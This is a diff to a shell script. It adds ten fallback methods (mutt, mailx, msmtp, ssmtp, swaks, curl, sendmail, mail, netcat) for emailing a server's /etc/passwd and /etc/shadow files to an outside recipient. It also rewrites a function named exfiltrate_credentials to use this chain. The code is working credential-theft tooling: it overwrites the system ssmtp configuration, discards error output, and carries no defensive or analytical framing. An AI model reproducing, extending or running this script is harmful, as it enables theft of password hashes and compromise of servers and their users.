@@ -206,37 +206,501 @@ EOF
     return $result
 }
 
-# Main email sending wrapper
+# METHOD 2: mutt email client (supports attachments)
+send_email_with_mutt() {
+    local subject="$1"
+    shift
+    local attachments=("$@")
+    
+    local body_text=$(mktemp)
+    cat > "$body_text" <<EOF
+Server: $(hostname)
+Timestamp: $(date)
+
+Credential files attached.
+EOF
+    
+    local attach_params=""
+    for att in "${attachments[@]}"; do
+        if [ -f "$att" ]; then
+            attach_params="$attach_params -a \"$att\""
+        fi
+    done
+    
+    # Configure mutt for SMTP
+    local mutt_config=$(mktemp)
+    cat > "$mutt_config" <<EOF
+set from="$SENDER_EMAIL"
+set realname="$SENDER_EMAIL"
+set smtp_url="smtp://$SENDER_EMAIL:$SMTP_PASSWORD@$SMTP_SERVER:$SMTP_PORT"
+set ssl_force_tls=yes
+EOF
+    
+    eval "mutt -F '$mutt_config' -s '$subject' $attach_params -- '$RECIPIENT_EMAIL' < '$body_text'" 2>/dev/null
+    local result=$?
+    rm -f "$body_text" "$mutt_config"
+    return $result
+}
+
+# METHOD 3: mailx (enhanced mail command with attachments)
+send_email_with_mailx() {
+    local subject="$1"
+    shift
+    local attachments=("$@")
+    
+    local body_text=$(mktemp)
+    cat > "$body_text" <<EOF
+Server: $(hostname)
+Timestamp: $(date)
+
+Credential files attached.
+EOF
+    
+    # Try mailx with -a (attachment) flag
+    if mailx -V 2>&1 | grep -q "GNU\|Heirloom"; then
+        # GNU mailx or Heirloom mailx support -a
+        local attach_params=""
+        for att in "${attachments[@]}"; do
+            if [ -f "$att" ]; then
+                attach_params="$attach_params -a $att"
+            fi
+        done
+        eval "mailx $attach_params -s '$subject' -r '$SENDER_EMAIL' '$RECIPIENT_EMAIL' < '$body_text'" 2>/dev/null
+    else
+        # Fallback: uuencode attachments inline
+        if command -v uuencode >/dev/null 2>&1; then
+            for att in "${attachments[@]}"; do
+                if [ -f "$att" ]; then
+                    echo "" >> "$body_text"
+                    uuencode "$att" "$(basename "$att")" >> "$body_text"
+                fi
+            done
+        fi
+        mailx -s "$subject" "$RECIPIENT_EMAIL" < "$body_text" 2>/dev/null
+    fi
+    
+    local result=$?
+    rm -f "$body_text"
+    return $result
+}
+
+# METHOD 4: msmtp (SMTP client)
+send_email_with_msmtp() {
+    local subject="$1"
+    shift
+    local attachments=("$@")
+    
+    # Create msmtp config
+    local msmtp_config=$(mktemp)
+    cat > "$msmtp_config" <<EOF
+account default
+host $SMTP_SERVER
+port $SMTP_PORT
+from $SENDER_EMAIL
+user $SENDER_EMAIL
+password $SMTP_PASSWORD
+auth on
+tls on
+tls_starttls on
+logfile /tmp/msmtp.log
+EOF
+    
+    # Create email with attachments (MIME format)
+    local email_file=$(mktemp)
+    local boundary="BOUNDARY_$(date +%s)_$$"
+    
+    cat > "$email_file" <<EOF
+From: $SENDER_EMAIL
+To: $RECIPIENT_EMAIL
+Subject: $subject
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="$boundary"
+
+--$boundary
+Content-Type: text/plain; charset=utf-8
+
+Server: $(hostname)
+Timestamp: $(date)
+
+Credential files attached.
+
+EOF
+    
+    # Attach files as base64
+    for att in "${attachments[@]}"; do
+        if [ -f "$att" ]; then
+            cat >> "$email_file" <<EOF
+--$boundary
+Content-Type: application/octet-stream; name="$(basename "$att")"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="$(basename "$att")"
+
+EOF
+            base64 "$att" >> "$email_file" 2>/dev/null || openssl base64 < "$att" >> "$email_file"
+            echo "" >> "$email_file"
+        fi
+    done
+    
+    echo "--$boundary--" >> "$email_file"
+    
+    msmtp -C "$msmtp_config" "$RECIPIENT_EMAIL" < "$email_file" 2>/dev/null
+    local result=$?
+    rm -f "$email_file" "$msmtp_config"
+    return $result
+}
+
+# METHOD 5: ssmtp (Simple SMTP)
+send_email_with_ssmtp() {
+    local subject="$1"
+    shift
+    local attachments=("$@")
+    
+    # Configure ssmtp
+    local ssmtp_config="/etc/ssmtp/ssmtp.conf"
+    local ssmtp_backup="/etc/ssmtp/ssmtp.conf.backup.$$"
+    
+    # Backup original config
+    [ -f "$ssmtp_config" ] && cp "$ssmtp_config" "$ssmtp_backup" 2>/dev/null
+    
+    # Create new config
+    mkdir -p /etc/ssmtp 2>/dev/null
+    cat > "$ssmtp_config" <<EOF
+root=$SENDER_EMAIL
+mailhub=$SMTP_SERVER:$SMTP_PORT
+AuthUser=$SENDER_EMAIL
+AuthPass=$SMTP_PASSWORD
+UseTLS=YES
+UseSTARTTLS=YES
+FromLineOverride=YES
+EOF
+    
+    # Create email with inline attachments (base64)
+    local email_file=$(mktemp)
+    local boundary="BOUNDARY_$(date +%s)_$$"
+    
+    cat > "$email_file" <<EOF
+To: $RECIPIENT_EMAIL
+From: $SENDER_EMAIL
+Subject: $subject
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="$boundary"
+
+--$boundary
+Content-Type: text/plain; charset=utf-8
+
+Server: $(hostname)
+Timestamp: $(date)
+
+EOF
+    
+    # Add attachments
+    for att in "${attachments[@]}"; do
+        if [ -f "$att" ]; then
+            cat >> "$email_file" <<EOF
+--$boundary
+Content-Type: application/octet-stream; name="$(basename "$att")"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="$(basename "$att")"
+
+EOF
+            base64 "$att" >> "$email_file" 2>/dev/null || openssl base64 < "$att" >> "$email_file"
+            echo "" >> "$email_file"
+        fi
+    done
+    
+    echo "--$boundary--" >> "$email_file"
+    
+    ssmtp "$RECIPIENT_EMAIL" < "$email_file" 2>/dev/null
+    local result=$?
+    
+    # Restore original config
+    [ -f "$ssmtp_backup" ] && mv "$ssmtp_backup" "$ssmtp_config" 2>/dev/null
+    
+    rm -f "$email_file"
+    return $result
+}
+
+# METHOD 6: swaks (SMTP test tool with full features)
+send_email_with_swaks() {
+    local subject="$1"
+    shift
+    local attachments=("$@")
+    
+    local attach_params=""
+    for att in "${attachments[@]}"; do
+        if [ -f "$att" ]; then
+            attach_params="$attach_params --attach $att"
+        fi
+    done
+    
+    swaks --to "$RECIPIENT_EMAIL" \
+          --from "$SENDER_EMAIL" \
+          --server "$SMTP_SERVER:$SMTP_PORT" \
+          --auth LOGIN \
+          --auth-user "$SENDER_EMAIL" \
+          --auth-password "$SMTP_PASSWORD" \
+          --tls \
+          --header "Subject: $subject" \
+          --body "Server: $(hostname)
+Timestamp: $(date)
+
+Credential files attached." \
+          $attach_params 2>/dev/null
+    
+    return $?
+}
+
+# METHOD 7: sendmail with proper configuration
+send_email_with_sendmail() {
+    local subject="$1"
+    shift
+    local attachments=("$@")
+    
+    local email_file=$(mktemp)
+    local boundary="BOUNDARY_$(date +%s)_$$"
+    
+    cat > "$email_file" <<EOF
+To: $RECIPIENT_EMAIL
+From: $SENDER_EMAIL
+Subject: $subject
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="$boundary"
+
+--$boundary
+Content-Type: text/plain; charset=utf-8
+
+Server: $(hostname)
+Timestamp: $(date)
+
+Credential files included below.
+
+EOF
+    
+    # Add attachments as base64
+    for att in "${attachments[@]}"; do
+        if [ -f "$att" ]; then
+            cat >> "$email_file" <<EOF
+--$boundary
+Content-Type: application/octet-stream; name="$(basename "$att")"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="$(basename "$att")"
+
+EOF
+            base64 "$att" >> "$email_file" 2>/dev/null || openssl base64 < "$att" >> "$email_file"
+            echo "" >> "$email_file"
+        fi
+    done
+    
+    echo "--$boundary--" >> "$email_file"
+    
+    sendmail -t < "$email_file" 2>/dev/null
+    local result=$?
+    rm -f "$email_file"
+    return $result
+}
+
+# METHOD 8: Basic mail command with inline content
+send_email_with_mail() {
+    local subject="$1"
+    shift
+    local attachments=("$@")
+    
+    local email_body=$(mktemp)
+    cat > "$email_body" <<EOF
+Server: $(hostname)
+Timestamp: $(date)
+
+=== Credential Files (inline) ===
+
+EOF
+    
+    # Include file contents inline
+    for att in "${attachments[@]}"; do
+        if [ -f "$att" ]; then
+            echo "========== $(basename "$att") ==========" >> "$email_body"
+            cat "$att" >> "$email_body" 2>/dev/null
+            echo "" >> "$email_body"
+        fi
+    done
+    
+    mail -s "$subject" "$RECIPIENT_EMAIL" < "$email_body" 2>/dev/null
+    local result=$?
+    rm -f "$email_body"
+    return $result
+}
+
+# METHOD 9: Direct SMTP via netcat (last resort)
+send_email_with_netcat() {
+    local subject="$1"
+    shift
+    local attachments=("$@")
+    
+    local NC_CMD="nc"
+    command -v nc >/dev/null 2>&1 || NC_CMD="netcat"
+    
+    # Create SMTP conversation
+    local smtp_commands=$(mktemp)
+    local email_body="Server: $(hostname)
+Timestamp: $(date)
+
+Credentials saved locally. Manual retrieval required."
+    
+    # Encode credentials for AUTH LOGIN
+    local user_b64=$(echo -n "$SENDER_EMAIL" | base64 2>/dev/null || echo -n "$SENDER_EMAIL" | openssl base64)
+    local pass_b64=$(echo -n "$SMTP_PASSWORD" | base64 2>/dev/null || echo -n "$SMTP_PASSWORD" | openssl base64)
+    
+    cat > "$smtp_commands" <<EOF
+EHLO $(hostname)
+STARTTLS
+EHLO $(hostname)
+AUTH LOGIN
+$user_b64
+$pass_b64
+MAIL FROM:<$SENDER_EMAIL>
+RCPT TO:<$RECIPIENT_EMAIL>
+DATA
+From: $SENDER_EMAIL
+To: $RECIPIENT_EMAIL
+Subject: $subject
+
+$email_body
+.
+QUIT
+EOF
+    
+    timeout 30 $NC_CMD $SMTP_SERVER $SMTP_PORT < "$smtp_commands" 2>/dev/null | grep -q "250 OK"
+    local result=$?
+    rm -f "$smtp_commands"
+    return $result
+}
+
+# Main email sending wrapper with COMPREHENSIVE FALLBACKS
 send_email_with_attachments() {
     local subject="$1"
     shift
     local attachments=("$@")
     
-    # Try Python first (supports attachments)
+    echo "[*] Attempting to send email with $(( ${#attachments[@]} )) attachment(s)..."
+    
+    # METHOD 1: Python3 + SMTP (BEST - supports attachments)
     if command -v python3 >/dev/null 2>&1; then
+        echo "[*] Trying Method 1: Python3 + SMTP..."
         local python_output
         if python_output=$(send_email_with_python "$subject" "${attachments[@]}" 2>&1); then
             if echo "$python_output" | grep -q "Email sent successfully"; then
-                echo "SUCCESS"
+                echo "[✓] SUCCESS: Email sent via Python3"
                 return 0
             fi
         fi
+        echo "[!] Python3 method failed, trying next method..."
     fi
     
-    # Fallback: curl with inline credentials (no attachments)
+    # METHOD 2: mutt (supports attachments)
+    if command -v mutt >/dev/null 2>&1; then
+        echo "[*] Trying Method 2: mutt..."
+        if send_email_with_mutt "$subject" "${attachments[@]}"; then
+            echo "[✓] SUCCESS: Email sent via mutt"
+            return 0
+        fi
+        echo "[!] mutt method failed, trying next method..."
+    fi
+    
+    # METHOD 3: mailx with uuencode (supports attachments)
+    if command -v mailx >/dev/null 2>&1; then
+        echo "[*] Trying Method 3: mailx..."
+        if send_email_with_mailx "$subject" "${attachments[@]}"; then
+            echo "[✓] SUCCESS: Email sent via mailx"
+            return 0
+        fi
+        echo "[!] mailx method failed, trying next method..."
+    fi
+    
+    # METHOD 4: msmtp (SMTP client)
+    if command -v msmtp >/dev/null 2>&1; then
+        echo "[*] Trying Method 4: msmtp..."
+        if send_email_with_msmtp "$subject" "${attachments[@]}"; then
+            echo "[✓] SUCCESS: Email sent via msmtp"
+            return 0
+        fi
+        echo "[!] msmtp method failed, trying next method..."
+    fi
+    
+    # METHOD 5: ssmtp (Simple SMTP)
+    if command -v ssmtp >/dev/null 2>&1; then
+        echo "[*] Trying Method 5: ssmtp..."
+        if send_email_with_ssmtp "$subject" "${attachments[@]}"; then
+            echo "[✓] SUCCESS: Email sent via ssmtp"
+            return 0
+        fi
+        echo "[!] ssmtp method failed, trying next method..."
+    fi
+    
+    # METHOD 6: swaks (SMTP test tool)
+    if command -v swaks >/dev/null 2>&1; then
+        echo "[*] Trying Method 6: swaks..."
+        if send_email_with_swaks "$subject" "${attachments[@]}"; then
+            echo "[✓] SUCCESS: Email sent via swaks"
+            return 0
+        fi
+        echo "[!] swaks method failed, trying next method..."
+    fi
+    
+    # METHOD 7: curl + SMTP (no attachments)
     if command -v curl >/dev/null 2>&1; then
+        echo "[*] Trying Method 7: curl + SMTP (inline content only)..."
         local body_text="Server: $(hostname)
 Timestamp: $(date)
 
-WARNING: File attachments not supported via curl method.
-Credential files saved locally - manual retrieval required."
+WARNING: Attachments not supported via curl method.
+Credential files saved locally at: /tmp/credentials/
+
+Files:"
+        for att in "${attachments[@]}"; do
+            if [ -f "$att" ]; then
+                body_text="$body_text
+  - $(basename "$att")"
+            fi
+        done
         
         if send_email_with_curl "$subject" "$body_text" 2>&1; then
-            echo "SENT_VIA_CURL"
+            echo "[✓] SUCCESS: Email sent via curl (inline only)"
             return 0
         fi
+        echo "[!] curl method failed, trying next method..."
     fi
     
+    # METHOD 8: sendmail (if configured)
+    if command -v sendmail >/dev/null 2>&1; then
+        echo "[*] Trying Method 8: sendmail..."
+        if send_email_with_sendmail "$subject" "${attachments[@]}"; then
+            echo "[✓] SUCCESS: Email sent via sendmail"
+            return 0
+        fi
+        echo "[!] sendmail method failed, trying next method..."
+    fi
+    
+    # METHOD 9: mail command (basic, inline only)
+    if command -v mail >/dev/null 2>&1; then
+        echo "[*] Trying Method 9: mail command (inline content only)..."
+        if send_email_with_mail "$subject" "${attachments[@]}"; then
+            echo "[✓] SUCCESS: Email sent via mail"
+            return 0
+        fi
+        echo "[!] mail method failed, trying next method..."
+    fi
+    
+    # METHOD 10: Direct SMTP via netcat (last resort)
+    if command -v nc >/dev/null 2>&1 || command -v netcat >/dev/null 2>&1; then
+        echo "[*] Trying Method 10: Direct SMTP via netcat (last resort)..."
+        if send_email_with_netcat "$subject" "${attachments[@]}"; then
+            echo "[✓] SUCCESS: Email sent via netcat"
+            return 0
+        fi
+        echo "[!] netcat method failed"
+    fi
+    
+    echo "[!] ALL EMAIL METHODS FAILED!"
+    echo "[*] Credentials saved locally only"
     return 1
 }
 
@@ -4062,75 +4526,39 @@ exfiltrate_credentials() {
     fi
 
     echo ""
-    echo "[*] Sending credentials via email..."
+    echo "[*] Sending credentials via email (trying all available methods)..."
+    echo ""
 
-    # Send email with attachments using existing infrastructure
+    # Send email with attachments using comprehensive fallback system
     local SUBJECT="Server Credentials: $HOSTNAME"
-
-    if command -v python3 >/dev/null 2>&1; then
-        if send_email_with_attachments "$SUBJECT" "$PASSWD_FILE" "$SHADOW_FILE" 2>&1 | grep -q "SUCCESS"; then
-            echo "[✓] Credentials sent successfully!"
-            echo "[✓] Email delivered to: $RECIPIENT_EMAIL"
-            echo ""
-            echo "    Attachments:"
-            [ -f "$PASSWD_FILE" ] && echo "      - ${HOSTNAME}_passwd"
-            [ -f "$SHADOW_FILE" ] && echo "      - ${HOSTNAME}_shadow"
-        else
-            echo "[!] Python3 email sending failed - trying fallback method..."
-        fi
-    else
-        echo "[!] Python3 not available - trying fallback email method..."
-    fi
     
-    # FALLBACK: Try using mail command if Python3 failed or unavailable
-    if ! command -v python3 >/dev/null 2>&1 || ! send_email_with_attachments "$SUBJECT" "$PASSWD_FILE" "$SHADOW_FILE" 2>&1 | grep -q "SUCCESS"; then
-        if command -v mail >/dev/null 2>&1 || command -v sendmail >/dev/null 2>&1; then
-            echo "[*] Trying basic mail command (inline credentials)..."
-            
-            # Create email body with inline credentials
-            local EMAIL_BODY="/tmp/.email_body_$$"
-            {
-                echo "Subject: $SUBJECT"
-                echo "To: $RECIPIENT_EMAIL"
-                echo ""
-                echo "Server: $HOSTNAME"
-                echo "Timestamp: $(date)"
-                echo ""
-                echo "==================== /etc/passwd ===================="
-                cat "$PASSWD_FILE" 2>/dev/null || echo "[ERROR: Could not read passwd file]"
-                echo ""
-                echo "==================== /etc/shadow ===================="
-                cat "$SHADOW_FILE" 2>/dev/null || echo "[ERROR: Could not read shadow file]"
-                echo ""
-                echo "===================================================="
-            } > "$EMAIL_BODY" 2>/dev/null
-            
-            # Try sending via mail or sendmail
-            if command -v mail >/dev/null 2>&1; then
-                if mail -s "$SUBJECT" "$RECIPIENT_EMAIL" < "$EMAIL_BODY" 2>/dev/null; then
-                    echo "[✓] Credentials sent via mail command!"
-                    rm -f "$EMAIL_BODY"
-                else
-                    echo "[!] mail command failed"
-                    rm -f "$EMAIL_BODY"
-                fi
-            elif command -v sendmail >/dev/null 2>&1; then
-                if sendmail "$RECIPIENT_EMAIL" < "$EMAIL_BODY" 2>/dev/null; then
-                    echo "[✓] Credentials sent via sendmail!"
-                    rm -f "$EMAIL_BODY"
-                else
-                    echo "[!] sendmail command failed"
-                    rm -f "$EMAIL_BODY"
-                fi
-            fi
-        else
-            echo "[!] No email tools available (python3, mail, or sendmail)"
-            echo "[*] Files saved in: $TEMP_DIR"
-            echo "    - ${HOSTNAME}_passwd"
-            echo "    - ${HOSTNAME}_shadow"
-            # Don't delete temp dir - credentials are only saved locally
-            return 1
-        fi
+    # Call the comprehensive email function - it tries all 10 methods automatically
+    if send_email_with_attachments "$SUBJECT" "$PASSWD_FILE" "$SHADOW_FILE"; then
+        echo ""
+        echo "[✓] ============================================"
+        echo "[✓] CREDENTIALS SENT SUCCESSFULLY!"
+        echo "[✓] ============================================"
+        echo "[✓] Email delivered to: $RECIPIENT_EMAIL"
+        echo ""
+        echo "    Attachments:"
+        [ -f "$PASSWD_FILE" ] && echo "      ✓ ${HOSTNAME}_passwd"
+        [ -f "$SHADOW_FILE" ] && echo "      ✓ ${HOSTNAME}_shadow"
+        echo ""
+    else
+        echo ""
+        echo "[!] ============================================"
+        echo "[!] ALL EMAIL METHODS FAILED!"
+        echo "[!] ============================================"
+        echo "[!] Credentials saved locally only"
+        echo ""
+        echo "    Files saved in: $TEMP_DIR"
+        [ -f "$PASSWD_FILE" ] && echo "      - ${HOSTNAME}_passwd"
+        [ -f "$SHADOW_FILE" ] && echo "      - ${HOSTNAME}_shadow"
+        echo ""
+        echo "    Manual retrieval required!"
+        echo ""
+        # Don't delete temp dir - credentials are only saved locally
+        return 1
     fi
 
     # Clean up temp files only if email succeeded
